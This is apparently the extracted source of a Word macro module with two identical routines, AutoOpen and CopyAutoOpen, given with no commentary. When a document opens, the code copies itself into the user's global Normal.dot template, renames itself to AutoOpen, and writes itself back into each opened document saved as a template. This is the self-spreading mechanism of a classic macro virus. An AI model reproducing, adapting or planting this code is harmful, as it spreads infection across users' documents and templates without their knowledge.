   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "CopyAutoOpen"

   Public Sub MAIN()
   Dim i
   Dim NormalAutoOpen
   Dim NormalCopyAutoOpen
   Dim ActiveAutoOpen
   Dim ActiveCopyAutoOpen
   Dim NewFileName$
   For i = 1 To WordBasic.CountMacros()
     If WordBasic.[MacroName$](i) = "AutoOpen" Then NormalAutoOpen = 1
     If WordBasic.[MacroName$](i) = "CopyAutoOpen" Then NormalCopyAutoOpen = 1
   Next i

   For i = 1 To WordBasic.CountMacros(1)
     If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then ActiveAutoOpen = 1
     If WordBasic.[MacroName$](i, 1) = "CopyAutoOpen" Then ActiveCopyAutoOpen = 1
   Next i

   NewFileName$ = WordBasic.[FileName$]()

   If NormalAutoOpen = 0 Then
     WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="CopyAutoOpen", NewName:="CopyAutoOpen", Tab:=3
     WordBasic.Organizer Rename:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="CopyAutoOpen", NewName:="AutoOpen", Tab:=3
   End If

   If NormalCopyAutoOpen = 0 Then
     WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="CopyAutoOpen", NewName:="CopyAutoOpen", Tab:=3
   End If

   If ActiveAutoOpen = 0 Then
     WordBasic.FileSaveAs Name:=NewFileName$, Format:=1
     WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=NewFileName$, Name:="CopyAutoOpen", NewName:="CopyAutoOpen", Tab:=3
     WordBasic.Organizer Rename:=1, Source:=NewFileName$, Destination:=NewFileName$, Name:="CopyAutoOpen", NewName:="AutoOpen", Tab:=3
   End If

   If ActiveCopyAutoOpen = 0 Then
     WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=NewFileName$, Name:="CopyAutoOpen", NewName:="CopyAutoOpen", Tab:=3
   End If
   WordBasic.FileSaveAs Name:=NewFileName$, Format:=1
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim i
   Dim NormalAutoOpen
   Dim NormalCopyAutoOpen
   Dim ActiveAutoOpen
   Dim ActiveCopyAutoOpen
   Dim NewFileName$
   For i = 1 To WordBasic.CountMacros()
     If WordBasic.[MacroName$](i) = "AutoOpen" Then NormalAutoOpen = 1
     If WordBasic.[MacroName$](i) = "CopyAutoOpen" Then NormalCopyAutoOpen = 1
   Next i

   For i = 1 To WordBasic.CountMacros(1)
     If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then ActiveAutoOpen = 1
     If WordBasic.[MacroName$](i, 1) = "CopyAutoOpen" Then ActiveCopyAutoOpen = 1
   Next i

   NewFileName$ = WordBasic.[FileName$]()

   If NormalAutoOpen = 0 Then
     WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="CopyAutoOpen", NewName:="CopyAutoOpen", Tab:=3
     WordBasic.Organizer Rename:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="CopyAutoOpen", NewName:="AutoOpen", Tab:=3
   End If

   If NormalCopyAutoOpen = 0 Then
     WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="CopyAutoOpen", NewName:="CopyAutoOpen", Tab:=3
   End If

   If ActiveAutoOpen = 0 Then
     WordBasic.FileSaveAs Name:=NewFileName$, Format:=1
     WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=NewFileName$, Name:="CopyAutoOpen", NewName:="CopyAutoOpen", Tab:=3
     WordBasic.Organizer Rename:=1, Source:=NewFileName$, Destination:=NewFileName$, Name:="CopyAutoOpen", NewName:="AutoOpen", Tab:=3
   End If

   If ActiveCopyAutoOpen = 0 Then
     WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=NewFileName$, Name:="CopyAutoOpen", NewName:="CopyAutoOpen", Tab:=3
   End If
   WordBasic.FileSaveAs Name:=NewFileName$, Format:=1
   End Sub
